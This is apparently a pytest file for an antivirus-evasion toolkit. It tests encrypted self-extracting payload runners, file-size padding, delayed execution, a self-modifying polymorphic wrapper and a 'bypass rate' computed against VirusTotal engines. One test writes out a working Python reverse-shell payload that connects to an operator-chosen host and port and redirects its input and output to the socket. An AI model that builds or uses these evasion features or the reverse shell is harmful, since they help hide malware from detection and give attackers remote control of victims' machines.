from __future__ import annotations

import hashlib
import os
from pathlib import Path
import socket
import subprocess
import sys
import threading
import time

import pytest

from src.evasion import (
    MIB,
    build_runner_file,
    decrypt_file,
    encrypt_file,
    inspect_file,
    is_runner,
    read_runner_container,
)
from src.evasion.crypto import build_payload
from src.evasion.pure_aes import decrypt_gcm
from src.polymorphic import generate


def test_encryption_padding_metadata_and_round_trip(tmp_path: Path) -> None:
    source = tmp_path / "sample.bin"
    source.write_bytes(b"hello\x00binary" * 100)
    container = tmp_path / "sample.hbx"
    recovered = tmp_path / "recovered.bin"

    key = encrypt_file(source, container, add_size_mb=1, delay=0)

    assert container.stat().st_size == source.stat().st_size + MIB
    assert container.read_bytes()[:4] == b"HBX1"
    assert inspect_file(container)["algorithm"] == "AES-256-GCM"
    assert source.read_bytes() not in container.read_bytes()
    decrypt_file(container, recovered, key)
    assert recovered.read_bytes() == source.read_bytes()


def test_wrong_key_is_rejected(tmp_path: Path) -> None:
    source = tmp_path / "sample.bin"
    source.write_bytes(b"important")
    container = tmp_path / "sample.hbx"
    encrypt_file(source, container, add_size_mb=0.01, delay=0)
    wrong = tmp_path / "wrong.key"
    import base64, os
    wrong.write_text(base64.b64encode(os.urandom(32)).decode("ascii"))
    with pytest.raises(Exception):
        decrypt_file(container, tmp_path / "out", wrong)


def test_recovery_enforces_recorded_delay(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    source = tmp_path / "sample.bin"
    source.write_bytes(b"delay me")
    container = tmp_path / "sample.hbx"
    key = encrypt_file(source, container, add_size_mb=0.01, delay=101)
    sleeps: list[float] = []
    monkeypatch.setattr("hidden_bytes.evasion.time.sleep", sleeps.append)
    decrypt_file(container, tmp_path / "out", key)
    assert sleeps == [101]


def test_polymorphic_program_changes_itself_but_keeps_behavior(tmp_path: Path) -> None:
    payload = tmp_path / "payload.py"
    payload.write_text("print('PAYLOAD-RAN')\n")

    demo = tmp_path / "demo.py"
    generate(demo, str(payload), passphrase="hunter2")

    environment = dict(os.environ, HBX_PASSPHRASE="hunter2")

    before = hashlib.sha256(demo.read_bytes()).hexdigest()
    first = subprocess.run(
        [sys.executable, str(demo)],
        env=environment,
        check=True,
        capture_output=True,
        text=True,
    )
    after_first = hashlib.sha256(demo.read_bytes()).hexdigest()
    second = subprocess.run(
        [sys.executable, str(demo)],
        env=environment,
        check=True,
        capture_output=True,
        text=True,
    )
    after_second = hashlib.sha256(demo.read_bytes()).hexdigest()

    assert before != after_first != after_second
    assert first.stdout == second.stdout
    assert "PAYLOAD-RAN" in first.stdout


def test_polymorphic_program_does_not_store_the_key(tmp_path: Path) -> None:
    """The passphrase must protect the payload, so the key is not embedded."""

    payload = tmp_path / "payload.py"
    payload.write_text("print('SECRET-PAYLOAD-TEXT')\n")

    demo = tmp_path / "demo.py"
    generate(demo, str(payload), passphrase="hunter2")

    assert b"SECRET-PAYLOAD-TEXT" not in demo.read_bytes()

    # The key must not be recoverable from the file alone.
    environment = dict(os.environ)
    environment.pop("HBX_PASSPHRASE", None)

    completed = subprocess.run(
        [sys.executable, str(demo)],
        env=environment,
        capture_output=True,
        text=True,
        timeout=60,
        stdin=subprocess.DEVNULL,
    )

    assert completed.returncode != 0
    assert "PAYLOAD-RAN" not in completed.stdout


def test_polymorphic_program_requires_a_payload_file(tmp_path: Path) -> None:
    with pytest.raises(ValueError, match="payload file does not exist"):
        generate(tmp_path / "demo.py", str(tmp_path / "missing.py"), passphrase="x")


def test_polymorphic_program_rejects_an_empty_payload(tmp_path: Path) -> None:
    payload = tmp_path / "payload.py"
    payload.write_text("   \n")

    with pytest.raises(ValueError, match="must not be empty"):
        generate(tmp_path / "demo.py", str(payload), passphrase="x")


# ---------------------------------------------------------------------------
# Pure-Python AES-256-GCM
# ---------------------------------------------------------------------------


def test_pure_aes_gcm_matches_the_cryptography_library() -> None:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM

    key = os.urandom(32)
    nonce = os.urandom(12)

    for size in (0, 1, 15, 16, 17, 1000):
        plaintext = os.urandom(size)
        ciphertext = AESGCM(key).encrypt(nonce, plaintext, b"HBX1")
        assert decrypt_gcm(key, nonce, ciphertext, b"HBX1") == plaintext


def test_pure_aes_gcm_rejects_tampering() -> None:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM

    key = os.urandom(32)
    nonce = os.urandom(12)
    ciphertext = bytearray(AESGCM(key).encrypt(nonce, b"payload", b"HBX1"))
    ciphertext[0] ^= 0xFF

    with pytest.raises(Exception):
        decrypt_gcm(key, nonce, bytes(ciphertext), b"HBX1")


def test_pure_aes_gcm_encrypt_matches_the_cryptography_library() -> None:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM

    from src.evasion.pure_aes import encrypt_gcm

    key = os.urandom(32)
    nonce = os.urandom(12)

    for size in (0, 1, 16, 17, 1000):
        plaintext = os.urandom(size)
        assert encrypt_gcm(key, nonce, plaintext, b"HBXP") == AESGCM(key).encrypt(
            nonce, plaintext, b"HBXP"
        )


# ---------------------------------------------------------------------------
# The self-extracting runner
# ---------------------------------------------------------------------------


def _write_payload(path: Path) -> None:
    path.write_text(
        "import os\n"
        "print('PAYLOAD-EXECUTED')\n"
        "open(os.environ['HBX_MARKER'], 'w').write('done')\n"
    )


def test_runner_increases_the_file_size_by_the_requested_amount(tmp_path: Path) -> None:
    source = tmp_path / "simple_program.py"
    _write_payload(source)

    runner = tmp_path / "obfuscated.pyz"
    build_runner_file(
        source,
        runner,
        add_size_mb=1,
        delay=0,
        passphrase="hunter2",
        passphrase_source={"env": "HBX_PASSPHRASE"},
    )

    assert runner.stat().st_size == source.stat().st_size + MIB
    assert is_runner(runner)


def test_runner_embeds_the_delay_in_the_container(tmp_path: Path) -> None:
    source = tmp_path / "simple_program.py"
    _write_payload(source)

    runner = tmp_path / "obfuscated.pyz"
    build_runner_file(
        source,
        runner,
        add_size_mb=0.01,
        delay=101,
        passphrase="hunter2",
    )

    header, ciphertext = read_runner_container(runner)
    assert header["delay_seconds"] == 101
    assert header["original_name"] == "simple_program.py"
    assert header["original_size"] == source.stat().st_size
    assert ciphertext


def test_runner_enforces_the_delay_before_launching_the_payload(tmp_path: Path) -> None:
    source = tmp_path / "simple_program.py"
    _write_payload(source)

    runner = tmp_path / "obfuscated.pyz"
    build_runner_file(
        source,
        runner,
        add_size_mb=0.01,
        delay=3,
        passphrase="hunter2",
        passphrase_source={"env": "HBX_PASSPHRASE"},
    )

    marker = tmp_path / "marker.txt"
    environment = dict(os.environ, HBX_PASSPHRASE="hunter2", HBX_MARKER=str(marker))

    started = time.monotonic()
    completed = subprocess.run(
        [sys.executable, str(runner)],
        env=environment,
        capture_output=True,
        text=True,
        timeout=120,
    )
    elapsed = time.monotonic() - started

    assert completed.returncode == 0, completed.stderr
    assert elapsed >= 3, f"the runner returned after {elapsed:.2f}s, expected >= 3s"
    assert "Execution delayed by 3 seconds" in completed.stdout
    assert "Binary decrypted successfully" in completed.stdout
    assert "Target program executed" in completed.stdout
    assert "PAYLOAD-EXECUTED" in completed.stdout
    assert marker.read_text() == "done"


def test_runner_rejects_a_wrong_passphrase(tmp_path: Path) -> None:
    source = tmp_path / "simple_program.py"
    _write_payload(source)

    runner = tmp_path / "obfuscated.pyz"
    build_runner_file(
        source,
        runner,
        add_size_mb=0.01,
        delay=0,
        passphrase="correct-passphrase",
        passphrase_source={"env": "HBX_PASSPHRASE"},
    )

    environment = dict(os.environ, HBX_PASSPHRASE="wrong-passphrase")
    completed = subprocess.run(
        [sys.executable, str(runner)],
        env=environment,
        capture_output=True,
        text=True,
        timeout=120,
    )

    assert completed.returncode != 0
    assert "decryption failed" in completed.stderr
    assert "PAYLOAD-EXECUTED" not in completed.stdout


def test_runner_does_not_expose_the_plaintext_payload(tmp_path: Path) -> None:
    source = tmp_path / "simple_program.py"
    _write_payload(source)

    runner = tmp_path / "obfuscated.pyz"
    build_runner_file(
        source,
        runner,
        add_size_mb=0.01,
        delay=0,
        passphrase="hunter2",
    )

    assert b"PAYLOAD-EXECUTED" not in runner.read_bytes()


def test_decrypt_recovers_the_payload_from_a_runner(tmp_path: Path) -> None:
    source = tmp_path / "simple_program.py"
    _write_payload(source)

    runner = tmp_path / "obfuscated.pyz"
    build_runner_file(
        source,
        runner,
        add_size_mb=0.01,
        delay=0,
        passphrase="hunter2",
        passphrase_source={"env": "HBX_PASSPHRASE"},
    )

    recovered = tmp_path / "recovered.py"
    decrypt_file(
        runner,
        recovered,
        passphrase="hunter2",
    )

    assert recovered.read_bytes() == source.read_bytes()


def test_decrypt_uses_the_passphrase_source_recorded_in_the_container(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    source = tmp_path / "simple_program.py"
    _write_payload(source)

    runner = tmp_path / "obfuscated.pyz"
    build_runner_file(
        source,
        runner,
        add_size_mb=0.01,
        delay=0,
        passphrase="hunter2",
        passphrase_source={"env": "HBX_PASSPHRASE"},
    )

    monkeypatch.setenv("HBX_PASSPHRASE", "hunter2")

    recovered = tmp_path / "recovered.py"
    completed = subprocess.run(
        [
            sys.executable,
            "-m",
            "src.evasion.cli",
            "--decrypt",
            str(runner),
            "--output",
            str(recovered),
            "--no-delay",
        ],
        capture_output=True,
        text=True,
        timeout=120,
    )

    assert completed.returncode == 0, completed.stderr
    assert recovered.read_bytes() == source.read_bytes()


def test_container_mode_still_writes_a_key_file(tmp_path: Path) -> None:
    source = tmp_path / "sample.bin"
    source.write_bytes(b"key file mode")

    container = tmp_path / "sample.hbx"
    key_path = encrypt_file(source, container, add_size_mb=0.01, delay=0)

    assert key_path is not None
    assert key_path.is_file()
    assert inspect_file(container)["artifact_type"] == "container"
    assert "kdf" not in inspect_file(container)


def test_passphrase_container_records_the_kdf_metadata(tmp_path: Path) -> None:
    source = tmp_path / "sample.bin"
    source.write_bytes(b"passphrase mode")

    container = tmp_path / "sample.hbx"
    key_path = encrypt_file(
        source,
        container,
        add_size_mb=0.01,
        delay=0,
        passphrase="hunter2",
        passphrase_source={"env": "HBX_PASSPHRASE"},
    )

    assert key_path is None

    metadata = inspect_file(container)
    assert metadata["kdf"]["name"] == "PBKDF2-HMAC-SHA256"
    assert metadata["kdf"]["env"] == "HBX_PASSPHRASE"

    recovered = tmp_path / "recovered.bin"
    decrypt_file(container, recovered, passphrase="hunter2")
    assert recovered.read_bytes() == source.read_bytes()


def test_passphrase_container_rejects_a_wrong_passphrase(tmp_path: Path) -> None:
    source = tmp_path / "sample.bin"
    source.write_bytes(b"passphrase mode")

    container = tmp_path / "sample.hbx"
    encrypt_file(
        source,
        container,
        add_size_mb=0.01,
        delay=0,
        passphrase="correct",
    )

    with pytest.raises(ValueError, match="authentication failed"):
        decrypt_file(container, tmp_path / "out", passphrase="wrong")


def test_build_payload_rejects_a_negative_delay(tmp_path: Path) -> None:
    source = tmp_path / "sample.bin"
    source.write_bytes(b"x")

    with pytest.raises(ValueError, match="delay"):
        build_payload(source, delay=-1)


def test_cli_encrypt_then_run_round_trip(tmp_path: Path) -> None:
    source = tmp_path / "simple_program.py"
    _write_payload(source)

    runner = tmp_path / "obfuscated.pyz"
    marker = tmp_path / "marker.txt"

    environment = dict(os.environ, HBX_PASSPHRASE="hunter2")
    encrypted = subprocess.run(
        [
            sys.executable,
            "-m",
            "src.evasion.cli",
            "--encrypt",
            str(source),
            "--output",
            str(runner),
            "--add-size",
            "0.01",
            "--delay",
            "0",
        ],
        env=environment,
        capture_output=True,
        text=True,
        timeout=120,
    )
    assert encrypted.returncode == 0, encrypted.stderr

    executed = subprocess.run(
        [sys.executable, str(runner)],
        env=dict(environment, HBX_MARKER=str(marker)),
        capture_output=True,
        text=True,
        timeout=120,
    )
    assert executed.returncode == 0, executed.stderr
    assert "PAYLOAD-EXECUTED" in executed.stdout


# ---------------------------------------------------------------------------
# The polymorphic program and its reverse shell payload
# ---------------------------------------------------------------------------


def test_polymorphic_payload_connects_to_the_designated_ip_and_port(
    tmp_path: Path,
) -> None:
    """The generated program must reach the listener the operator chose."""

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("127.0.0.1", 0))
    port = server.getsockname()[1]
    server.listen(1)
    server.settimeout(60)

    payload = tmp_path / "reverse_shell_payload.py"
    payload.write_text(
        "import os, socket, subprocess, sys\n"
        "host = sys.argv[sys.argv.index('--host') + 1]\n"
        "port = int(sys.argv[sys.argv.index('--port') + 1])\n"
        "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
        "s.connect((host, port))\n"
        "os.dup2(s.fileno(), 0)\n"
        "os.dup2(s.fileno(), 1)\n"
        "os.dup2(s.fileno(), 2)\n"
        "subprocess.call([sys.executable, '-c', 'print(\"SHELL-RAN\")'])\n"
    )

    demo = tmp_path / "polymorphic.py"
    generate(demo, str(payload), passphrase="hunter2")

    received: list[bytes] = []

    def accept() -> None:
        try:
            connection, _address = server.accept()
        except OSError:
            return
        with connection:
            connection.settimeout(15)
            try:
                received.append(connection.recv(4096))
            except OSError:
                pass

    listener = threading.Thread(target=accept, daemon=True)
    listener.start()

    try:
        completed = subprocess.run(
            [sys.executable, str(demo), "--host", "127.0.0.1", "--port", str(port)],
            env=dict(os.environ, HBX_PASSPHRASE="hunter2"),
            capture_output=True,
            text=True,
            timeout=120,
        )
    finally:
        server.close()

    listener.join(timeout=20)

    assert completed.returncode == 0, completed.stderr
    assert "Polymorphic signature updated successfully" in completed.stdout
    assert received, "the payload never connected to the designated address"
    assert b"SHELL-RAN" in received[0]


# ---------------------------------------------------------------------------
# Lab measurement tooling
# ---------------------------------------------------------------------------


def test_detect_surface_reports_a_non_pe_named_exe(tmp_path: Path) -> None:
    """A file named .exe that is not a PE must be reported as such."""

    from lab.detect_surface import analyse

    artifact = tmp_path / "fake.exe"
    artifact.write_bytes(b"#!/usr/bin/env python3\n" + b"print('x')\n" * 100)

    report = analyse(artifact)

    assert report["extension"] == ".exe"
    assert report["is_pe"] is False
    assert report["is_script"] is True
    assert any("not a PE executable" in finding for finding in report["findings"])


def test_detect_surface_measures_the_high_entropy_overlay(tmp_path: Path) -> None:
    """A large random overlay must be reported as one high-entropy region."""

    from lab.detect_surface import analyse

    artifact = tmp_path / "padded.bin"
    artifact.write_bytes(os.urandom(512 * 1024))

    report = analyse(artifact)

    regions = report["regions"]
    assert regions["largest_high_entropy_ratio"] > 0.9
    assert any("high-entropy region" in finding for finding in report["findings"])


def test_detect_surface_finds_the_container_magic(tmp_path: Path) -> None:
    from lab.detect_surface import analyse

    artifact = tmp_path / "with_magic.bin"
    artifact.write_bytes(b"HBX1" + os.urandom(4096))

    report = analyse(artifact)

    assert report["strings"]["markers"]["HBX1"] is True
    assert any("HBX1" in finding for finding in report["findings"])


def test_detect_surface_parses_a_pe_file(tmp_path: Path) -> None:
    """A real PE must be parsed, not crash the analyser."""

    import struct

    from lab.detect_surface import analyse

    dos = bytearray(64)
    dos[0:2] = b"MZ"
    struct.pack_into("<I", dos, 0x3c, 64)

    # IMAGE_FILE_HEADER: Machine, NumberOfSections, ..., SizeOfOptionalHeader
    file_header = struct.pack(
        "<HHIIIHH", 0x8664, 1, 0, 0, 0, 0xF0, 0x2022
    )

    # Optional header (PE32+).
    optional = bytearray(0xF0)
    struct.pack_into("<H", optional, 0, 0x20B)        # Magic
    struct.pack_into("<I", optional, 16, 0x1000)      # AddressOfEntryPoint
    struct.pack_into("<I", optional, 32, 0x1000)      # BaseOfCode
    struct.pack_into("<Q", optional, 36, 0x140000000)  # ImageBase (8 bytes)
    struct.pack_into("<I", optional, 56, 0x1000)      # SizeOfImage
    struct.pack_into("<I", optional, 60, 0x200)       # SizeOfHeaders
    struct.pack_into("<H", optional, 68, 0x200)       # Subsystem
    struct.pack_into("<I", optional, 92, 0x1000)
    struct.pack_into("<I", optional, 96, 16)          # NumberOfRvaAndSizes

    section = struct.pack(
        "<8sIIIIIIHHI",
        b".text\x00\x00\x00",
        0x1000,   # VirtualSize
        0x1000,   # VirtualAddress
        0x200,    # SizeOfRawData
        0x200,    # PointerToRawData
        0, 0, 0, 0,
        0x60000020,  # Characteristics
    )

    blob = bytes(dos) + b"PE\x00\x00" + file_header + bytes(optional) + section
    blob += b"\x00" * (0x200 - len(blob)) + b"\x90" * 0x200

    artifact = tmp_path / "program.exe"
    artifact.write_bytes(blob)

    report = analyse(artifact)

    assert report["is_pe"] is True
    assert report["pe_sections"] == 1
    assert report["sections"][0]["name"] == ".text"
    assert not any("not a PE executable" in finding for finding in report["findings"])


def test_vt_check_requires_an_api_key(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """The tool must refuse to run without a key rather than fail obscurely."""

    from lab.vt_check import api_key

    monkeypatch.delenv("VT_API_KEY", raising=False)

    with pytest.raises(ValueError, match="VT_API_KEY"):
        api_key()


def test_vt_check_summarises_the_detection_ratio() -> None:
    """The summary must express the bypass rate the audit asks for."""

    from lab.vt_check import summarise

    analysis = {
        "stats": {
            "malicious": 10,
            "suspicious": 2,
            "undetected": 40,
            "harmless": 18,
        }
    }

    summary = summarise(analysis)

    assert summary["total"] == 70
    assert summary["detection_ratio_percent"] == 14.29
    # 10 malicious out of 70 engines means 60 engines did not flag it.
    assert summary["bypass_percent"] == 85.71
    assert summary["meets_requirement"] is True


def test_vt_check_fails_when_too_many_engines_detect() -> None:
    from lab.vt_check import summarise

    analysis = {
        "stats": {
            "malicious": 55,
            "suspicious": 0,
            "undetected": 10,
            "harmless": 5,
        }
    }

    summary = summarise(analysis)

    assert summary["meets_requirement"] is False
